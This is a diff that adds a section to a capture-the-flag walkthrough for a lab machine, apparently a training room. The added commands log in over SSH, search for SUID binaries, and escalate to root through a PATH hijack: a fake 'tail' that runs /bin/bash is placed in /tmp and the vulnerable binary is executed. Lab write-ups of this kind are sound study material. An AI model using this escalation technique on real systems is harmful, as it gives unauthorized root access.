@@ -1717,8 +1717,57 @@ urieljames
 ssh -i id_rsa barry@ip
 ```
 
+```
+cat user.txt
+```
+
 ![enum result](Assets/98.png)
 
+```
+find / -perm -u=s 2>/dev/null
+```
+
+We found a SUID binary out of ordinary
+
+![enum result](Assets/99.png)
+
+```
+ strings /home/joe/live_log 
+```
+
+![enum result](Assets/100.png)
+
+As we solved kenobi last time, we found a command in that too which was curl and we were able to create a file and then give it a shell and then use it to gain access
+
+```
+cd /tmp
+```
+
+```
+echo "/bin/bash" > tail
+```
+
+```
+chmod 777 tail
+```
+
+```
+export PATH=/tmp:$PATH
+```
+
+```
+/home/joe/live_log
+```
+
+```
+cd /root
+```
+
+```
+cat root.txt
+```
+
+![enum result](Assets/101.png)
 
 ## 11. Game Server
 
